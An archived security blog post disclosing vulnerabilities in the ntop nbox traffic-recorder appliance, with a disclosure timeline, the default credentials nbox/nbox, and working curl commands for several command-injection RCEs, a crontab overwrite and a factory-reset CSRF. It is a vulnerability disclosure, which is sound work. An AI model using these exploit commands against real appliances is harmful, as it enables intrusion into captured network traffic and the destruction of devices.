@@ -1,0 +1,202 @@
+<!DOCTYPE html><html><head><title>Got any RCEs?</title></head><body>
+<h1>Got any RCEs?</h1><p><a href="http://carnal0wnage.attackresearch.com/2016/08/got-any-rces.html" target="_new">Original URL</a></p>
+<p><blockquote>Security is a boomin&#x2019;, and so there are many different appliances to protect your network. Some of them do very little to protect, some of them open new holes in your network. In line with&hellip;</blockquote></p>
+<div>
+
+
+<div class="post-body entry-content" id="post-body-8751109170827898764">
+<div dir="ltr">
+<div dir="ltr">
+<div dir="ltr">
+<span><span>Security is a boomin&#x2019;, and so there are many different appliances to protect your network. Some of them do very little to protect, some of them open new holes in <a href="http://googleprojectzero.blogspot.com/2016/06/how-to-compromise-enterprise-endpoint.html" target="_blank">your</a> <a href="http://googleprojectzero.blogspot.com/2015/12/fireeye-exploitation-project-zeros.html" target="_blank">network</a>.</span></span><br>
+<span><span><br></span></span>
+<span><span>In line with best practice, many Security teams capture all network traffic using a variety of solutions, some closed, some open source. Once the traffic is stored, it can be used to detect badness, or just examine traffic patterns on corporate assets.</span></span><br>
+<span><span><br></span></span>
+<span><span>One of these open source options is NTOP, which of course has an appliance version, called nbox recorder. &#xA0;It goes without saying, if this traffic data were to be exposed, the consequences could be catastrophic. Consider stored credentials, authentication data, PII, internal data leakage...</span></span></div>
+</div>
+<table cellpadding="0" cellspacing="0" class="tr-caption-container"><tbody>
+<tr><td><img alt="pcap_tee.png" src="https://lh6.googleusercontent.com/B31suDI2IuaZo1yQPOzXynk5hyjQnDts_h0pJco1Wa0c8CdLAvvnD-qFe-VQXmbdCd0zCnQwhlj3jfrSMgM0EFQOMrAue0tawHsaUyOCzVE4MWcOCvBL6KdBObCLRofLO05kGFXY" width="278"></td></tr>
+<tr><td class="tr-caption">PCAP or it didn't happen</td></tr>
+</tbody></table>
+<br>
+<div>
+<span>You can either buy a ready-to-go appliance or with some drudge work you can build your own. Just get a license for nbox and just put it into a Linux box, they are nice like that providing </span><span>all the </span><a href="http://packages.ntop.org/apt/" target="_blank">repositories</a><span> and the steps are simple and easy to follow. Just spin up an Ubuntu VM and run:</span></div>
+<div>
+<div>
+
+
+
+<br>
+<p dir="ltr">
+<span id="docs-internal-guid-6b657cf4-2912-c906-56d0-35da938d3bbe"><span>wget http://apt.ntop.org/14.04/all/apt-ntop.deb</span></span></p>
+<span id="docs-internal-guid-6b657cf4-2912-c906-56d0-35da938d3bbe">
+<span>sudo dpkg -i apt-ntop.deb</span><br>
+<span>sudo apt-get clean all</span><br>
+<span>sudo apt-get update</span><br>
+<span>sudo apt-get install -y pfring nprobe ntopng ntopng-data n2disk cento nbox</span></span><br>
+<span><br></span>
+<br>
+<span><br></span>
+<br>
+<div dir="ltr">
+<p dir="ltr">
+<span><span>BOOM! You are ready to go. Now you have a nbox recorder ready to be used. And abused!</span></span><br>
+<span><span>The default credentials are nbox/nbox and it does use Basic Auth to be accessed.</span></span><br>
+<span><span><br></span></span>
+<span><span>Before I continue, imagine that you have this machine capturing all the traffic of your network. Listening to all your corporate communications or production traffic and storing them on disk. How bad would it be if an attacker gets full access to it? Take a minute to think about it.</span></span></p>
+</div>
+
+<br>
+
+<span id="docs-internal-guid-6b657cf4-2912-c906-56d0-35da938d3bbe">
+<table cellpadding="0" cellspacing="0" class="tr-caption-container"><tbody>
+<tr><td><img alt="nervs.gif" src="https://lh6.googleusercontent.com/DQ9lZTcCamRalOR8hqKbAw0xjGXobR0Y9ZEOWul_f6iDfVLzp5Dk0DGAPUfg3YDJXTQOpD4caIAOahLpItk8TJ1lfBPUCZPipmbPMkCNV1Hq6swLBMxRHbfPfAIB9IXOE3QplAQ3" width="500"></td></tr>
+<tr><td class="tr-caption">Uh-oh...</td></tr>
+</tbody></table>
+</span></div>
+<div>
+<p dir="ltr">
+<span><span>This level of exposure caught my eye, and I wanted to verify that having one of these sitting in your network does not make you more exposed. Unfortunately, I found several issues that could have been catastrophic with a malicious intent.</span></span><br>
+<span><span><br></span></span>
+<span><span>I do believe in the responsible disclosure process, however after repeatedly notifying both ntop and MITRE, these issues were not given high priority nor visibility. The following table details the timeline around my disclosure communications:&#xA0;</span></span><br>
+<span><span><br></span></span>
+<span><span><u>Disclosure Timeline</u></span></span><br>
+<span><span><br></span></span>
+<span><span>12/27/2014 - Sent to ntop details about some nbox vulnerabilities discovered in version 2.0</span></span><br>
+<span><span>01/15/2015 - Asked ntop for an update about the vulnerabilities sent</span></span><br>
+<span><span>01/16/2015 - Requested by ntop the details again, stating they may have been fixed</span></span><br>
+<span><span>01/18/2015 - Sent for a second time the vulnerabilities details. Mentioned to request CVEs</span></span><br>
+<span><span>05/24/2015 - Asked ntop for an update about the vulnerabilities sent and to request CVEs</span></span><br>
+<span><span>01/06/2016 - Noticed new nbox version is out (2.3) and found more vulnerabilities. Old vulnerabilities are fixed. Sent ntop an email about new issues and to request CVEs</span></span><br>
+<span><span>01/06/2016 - Quick answer ignoring my request for CVEs and just asking for vulnerabilities details.</span></span><br>
+<span><span>01/28/2016 - Sent request for CVEs to MITRE, submitting a full report with all the issues and steps to reproduce.</span></span><br>
+<span><span>02/17/2016 - Asked MITRE for an update on the issues submitted.</span></span><br>
+<span><span>02/17/2016 - Reply from MITRE: &#x201C;Your request is outside the scope of CVE's published priorities. As such, it will not be assigned a CVE-ID by MITRE or another CVE CNA at this time.&#x201D;</span></span><br>
+<br>
+<span><span>07/10/2016 - Noticed new nbox version (2.5) with partial fixes for some vulnerabilities in the previous (2.3) version</span></span><br>
+<span><span><br></span></span>
+<span><span>The ntop team initially refused to comment and silently fixed the bugs. MITRE then said this wasn't severe enough to warrant a CVE. As such, I have now chosen to highlight the issues here in an effort to have them remediated. I again want to highlight that I take this process very seriously, but after consulting with multiple other individuals, I feel that both the ntop team and MITRE have left me no other responsible options.</span></span></p>
+<span id="docs-internal-guid-6b657cf4-2925-003f-6ebc-d938c63154a6"><table cellpadding="0" cellspacing="0" class="tr-caption-container"><tbody>
+<tr><td><img alt="neotrain1.jpg" src="https://lh5.googleusercontent.com/ZV0NYfEQ3p7nIGURMM6WNa4XhLz4WD8AHYIpmJssdAMcu-FCRsFoLjZkmZubWXTAN8hDdGmH6xubb0aoILUlYhJexp4asCRpGfGkiALRDg52jPa3GPPQ973qzij_fETl7uv6xr9f" width="400"></td></tr>
+<tr><td class="tr-caption">Here comes the paintrain!</td></tr>
+</tbody></table>
+</span><br>
+<p dir="ltr">
+<span id="docs-internal-guid-6b657cf4-2925-003f-6ebc-d938c63154a6"><span id="docs-internal-guid-6b657cf4-2926-4669-2733-5aeb28f02a3c"><span>*<i>Replace NTOP-BOX with the IP address of your appliance (presuming that you already logged in). Note that most of the RCEs are </i></span><i><span>wrapped in sudo</span><span> so it makes the pwnage much more interesting:</span></i></span></span></p>
+<i><span id="docs-internal-guid-6b657cf4-2925-003f-6ebc-d938c63154a6"><span id="docs-internal-guid-6b657cf4-2926-4669-2733-5aeb28f02a3c"></span></span>
+</i><br>
+<p dir="ltr">
+<span><br></span>
+<span id="docs-internal-guid-6b657cf4-2925-003f-6ebc-d938c63154a6"><span id="docs-internal-guid-6b657cf4-2926-4669-2733-5aeb28f02a3c"><span>RCE: POST against https://NTOP-BOX/ntop-bin/write_conf_users.cgi with parameter cmd=touch /tmp/HACK</span></span></span><br>
+<span><br></span>
+<span>curl -sk --user nbox:nbox --data 'cmd=touch /tmp/HACK' https://NTOP-BOX/ntop-bin/write_conf_users.cgi</span><br>
+<span><br></span></p>
+<span id="docs-internal-guid-6b657cf4-2925-003f-6ebc-d938c63154a6"></span>
+<br>
+<p dir="ltr">
+<span id="docs-internal-guid-6b657cf4-2925-003f-6ebc-d938c63154a6"><span id="docs-internal-guid-6b657cf4-2926-4669-2733-5aeb28f02a3c"><span>RCE: POST against https://NTOP-BOX/ntop-bin/rrd_net_graph.cgi with parameters interface=;touch /tmp/HACK;</span></span></span><br>
+<span><br></span></p>
+<span id="docs-internal-guid-6b657cf4-2925-003f-6ebc-d938c63154a6"></span>
+<br>
+<p dir="ltr">
+<span id="docs-internal-guid-6b657cf4-2925-003f-6ebc-d938c63154a6"><span id="docs-internal-guid-6b657cf4-2926-4669-2733-5aeb28f02a3c"><span><span>curl -sk --user nbox:nbox --data 'interface=;touch /tmp/HACK;' https://NTOP-BOX/ntop-bin/rrd_net_graph.cgi</span></span></span></span><br>
+<span><span><br></span></span></p>
+<span id="docs-internal-guid-6b657cf4-2925-003f-6ebc-d938c63154a6"></span>
+<br>
+<p dir="ltr">
+<span id="docs-internal-guid-6b657cf4-2925-003f-6ebc-d938c63154a6"><span id="docs-internal-guid-6b657cf4-2926-4669-2733-5aeb28f02a3c"><span>RCE (Wrapped in sudo): GET https://NTOP-BOX/ntop-bin/pcap_upload.cgi?dir=|touch%20/tmp/HACK&amp;pcap=pcap</span></span></span><br>
+<span><br></span></p>
+<span id="docs-internal-guid-6b657cf4-2925-003f-6ebc-d938c63154a6"></span>
+<br>
+<p dir="ltr">
+<span id="docs-internal-guid-6b657cf4-2925-003f-6ebc-d938c63154a6"><span id="docs-internal-guid-6b657cf4-2926-4669-2733-5aeb28f02a3c"><span><span>curl -sk --user nbox:nbox https://NTOP-BOX/ntop-bin/pcap_upload.cgi?dir=|touch%20/tmp/HACK&amp;pcap=pcap</span></span></span></span><br>
+<span><span><br></span></span></p>
+<span id="docs-internal-guid-6b657cf4-2925-003f-6ebc-d938c63154a6"></span>
+<br>
+<p dir="ltr">
+<span id="docs-internal-guid-6b657cf4-2925-003f-6ebc-d938c63154a6"><span id="docs-internal-guid-6b657cf4-2926-4669-2733-5aeb28f02a3c"><span>RCE (Wrapped in sudo): GET https://NTOP-BOX/ntop-bin/sudowrapper.cgi?script=adm_storage_info.cgi&amp;params=P%22|whoami%3E%20%22/tmp/HACK%22|echo%20%22</span></span></span></p>
+<span id="docs-internal-guid-6b657cf4-2925-003f-6ebc-d938c63154a6"></span>
+<p dir="ltr">
+<span id="docs-internal-guid-6b657cf4-2925-003f-6ebc-d938c63154a6"><span id="docs-internal-guid-6b657cf4-2926-4669-2733-5aeb28f02a3c"><span><span>curl -sk --user nbox:nbox https://NTOP-BOX/ntop-bin/sudowrapper.cgi?script=adm_storage_info.cgi&amp;params=P%22|whoami%3E%20%22/tmp/HACK%22|echo%20%22</span></span></span></span></p>
+<span id="docs-internal-guid-6b657cf4-2925-003f-6ebc-d938c63154a6"></span><br>
+<p dir="ltr">
+<span id="docs-internal-guid-6b657cf4-2925-003f-6ebc-d938c63154a6"><span id="docs-internal-guid-6b657cf4-2926-4669-2733-5aeb28f02a3c"><span>RCE: POST against https://NTOP-BOX/ntop-bin/do_mergecap.cgi with parameters opt=Merge&amp;base_dir=/tmp&amp;out_dir=/tmp/DOESNTEXIST;touch /tmp/HACK;exit%200</span></span></span></p>
+<div id="docs-internal-guid-6b657cf4-2925-003f-6ebc-d938c63154a6"><div id="docs-internal-guid-6b657cf4-2926-4669-2733-5aeb28f02a3c">
+<br><p dir="ltr">
+<span><span>curl -sk --user nbox:nbox --data 'opt=Merge&amp;base_dir=/tmp&amp;out_dir=/tmp/DOESNTEXIST;touch /tmp/HACK;exit 0' https://NTOP-BOX/ntop-bin/do_mergecap.cgi</span></span></p>
+<br><p dir="ltr">
+<span>There are some other interesting things, for example, it was possible to have a persistent XSS by rewriting crontab with a XSS payload on it, but they fixed it in 2.5. However the crontab overwrite (Wrapped in sudo) is still possible:</span></p>
+
+<p dir="ltr">
+<span>GET https://NTOP-BOX/ntop-bin/do_crontab.cgi?act_cron=COMMANDS%20TO%20GO%20IN%20CRON</span></p>
+<br><p dir="ltr">
+<span><span><span>curl -sk --user nbox:nbox https://NTOP-BOX/ntop-bin/do_crontab.cgi?act_cron=</span></span><span>COMMANDS%20TO%20GO%20IN%20CRON</span></span></p>
+<br><p dir="ltr">
+<span>The last one is a CSRF that leaves the machine fried, by resetting the machine completely:</span></p>
+<p dir="ltr">
+<span>GET https://NTOP-BOX/ntop-bin/do_factory_reset.cgi</span></p>
+
+<p dir="ltr">
+<span><span>curl -sk --user nbox:nbox https://NTOP-BOX/ntop-bin/</span><span>do_factory_reset.cgi</span></span></p>
+<br><span><br></span></div></div></div>
+<p>
+<span id="docs-internal-guid-95f8719a-4409-b1a2-ff6f-b54018c88be7"><span>To make things easier, I created a Vagrantfile with provisioning so you can have your own nbox appliance and test my findings or give it a shot. There is more stuff to be found, trust me :)</span></span></p>
+<div>
+<br>
+<div dir="ltr">
+<span id="docs-internal-guid-6b657cf4-2928-397a-7975-83a977b2aa73"><a href="https://github.com/javuto/nbox-pwnage"><span>https://github.com/javuto/nbox-pwnage</span></a></span><br>
+<span><br></span></div>
+
+<br>
+<p dir="ltr">
+<span id="docs-internal-guid-6b657cf4-2928-397a-7975-83a977b2aa73"><span>And you can run the checker.sh to check for all the above attacks. Pull requests are welcome if you find more!</span></span></p>
+
+<br>
+
+
+<br>
+<div>
+<span id="docs-internal-guid-6b657cf4-2928-397a-7975-83a977b2aa73"><span><img alt="Screen Shot 2016-07-26 at 10.00.27.png" src="https://lh3.googleusercontent.com/50dMQwLtkp1rHRUv2OhbNqs5g4ghZ0SeY_wB9RZ9dBmh0B8NuwIHbTBymh4xZCQnr2t7vn9t_VA_Jxk3Q40gNsmIsUJFxo-xs64oSaun5THTJk_C17K8QfEvKXDB3isP4afWzRqv" width="640"></span></span></div>
+
+<br>
+
+
+<br>
+
+
+<br>
+<div>
+<span id="docs-internal-guid-6b657cf4-2928-397a-7975-83a977b2aa73"><span><img alt="nodding.gif" src="https://lh3.googleusercontent.com/SL81q5GFZYgdqIXelpCbTwSC1IYcQHifAbbLM2YX7TzLoxpMRlRCAi23KWCY_IPpIIy2afdxyzzkI8Yc4jIehIHLnB0dCfFB6xau5WeDF15C3TVxOnCR-10Zu40-vV8_j5S9rq-c" width="424"></span></span></div>
+
+<br>
+<div>
+<span id="docs-internal-guid-6b657cf4-2928-397a-7975-83a977b2aa73"><br></span>
+<br>
+<div dir="ltr">
+<span><span><br></span></span>
+<br>
+<p>
+<span id="docs-internal-guid-6b657cf4-2928-397a-7975-83a977b2aa73"><span><span><i>(The issues were found originally in nbox 2.3 and confirmed in nbox 2.5)</i></span></span></span></p>
+</div>
+<span id="docs-internal-guid-6b657cf4-2928-397a-7975-83a977b2aa73"></span>
+<br>
+<p dir="ltr">
+<span id="docs-internal-guid-6b657cf4-2928-397a-7975-83a977b2aa73"><span><span>Modules for metasploit and BeEF will come soon. I hope this time the issues are not just silently patched...</span></span></span></p>
+
+<span id="docs-internal-guid-6b657cf4-2928-397a-7975-83a977b2aa73"><span>If you have any questions or feedback, hit me up in twitter (@javutin)!<br>
+</span></span><br>
+<p dir="ltr">
+<span id="docs-internal-guid-6b657cf4-2928-397a-7975-83a977b2aa73"><span><span>Have a nice day!</span></span></span></p>
+<span id="docs-internal-guid-6b657cf4-2928-397a-7975-83a977b2aa73"></span></div>
+
+<br>
+
+
+</div>
+</div>
+</div>
+
+</div>
+
+</div>
+</body></html>
